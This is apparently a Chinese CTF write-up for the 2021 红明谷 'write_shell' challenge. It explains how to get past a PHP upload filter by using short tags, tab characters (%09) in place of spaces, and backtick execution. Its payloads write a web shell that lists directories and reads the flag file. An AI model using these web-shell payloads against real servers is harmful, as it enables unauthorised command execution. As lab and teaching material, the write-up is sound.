# [红明谷CTF 2021]write_shell %09绕过过滤空格 ``执行

**目录**

[TOC]



看看代码

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
function check($input){
    if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
过滤了 木马类型的东西
        // if(preg_match("/'| |_|=|php/",$input)){
        die('hacker!!!');
    }else{
        return $input;
    }
}
 
function waf($input){
  if(is_array($input)){
      foreach($input as $key=>$output){
          $input[$key] = waf($output);
如果是数组 就先变为 变量类型 然后再waf
      }
  }else{
      $input = check($input);
  }
}
这里就是对input 进行waf
 
 
$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
存入 sandbox/md5(当前ip地址)/目录中
 
if(!file_exists($dir)){
    mkdir($dir);
}
switch($_GET["action"] ?? "") {
    case 'pwd':
        echo $dir;
        break;
这里可以看我们当前存入的是哪个目录
 
    case 'upload':
        $data = $_GET["data"] ?? "";
        waf($data);
        file_put_contents("$dir" . "index.php", $data);
}
?>
```

还是很简单的

存在两个方式

## 1.正常短标签

我们经过测试 能发现有一个短标签

<?system()?> 没被过滤 可以用于写入php代码

我们可以写入 ls看看 单引号被过滤我们使用双引号

```cobol
?action=upload&data=<?system("ls")?>
```

然后去访问目录下的index.php



<img src="https://i-blog.csdnimg.cn/blog_migrate/5221c587c3fc9c9e520aecc87c9180d5.png" alt="" style="max-height:146px; box-sizing:content-box;" />


执行成功

我们就可以开始想 我们如果要看根目录 我们需要 ls / 只有空格被过滤了 我们如何绕过

网上一搜一大把

最简单的就是tab urlencode 即 %09

```cobol
?action=upload&data=<?system("ls%09/")?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/415aeadf4598c869f778c2364500bda0.png" alt="" style="max-height:190px; box-sizing:content-box;" />


执行 我们同样payloadcat一下



<img src="https://i-blog.csdnimg.cn/blog_migrate/369a3435b9c8f444f69c132531117ba0.png" alt="" style="max-height:155px; box-sizing:content-box;" />


## 2.短标签配合内联执行

```cobol
?action=upload&data=<?echo%09`ls`?>
```

直接执行

同样的道理访问即可

```cobol
?action=upload&data=<?echo%09`ls%09/`?>
 
?action=upload&data=<?echo%09`cat%09/flllllll1112222222lag`?>
```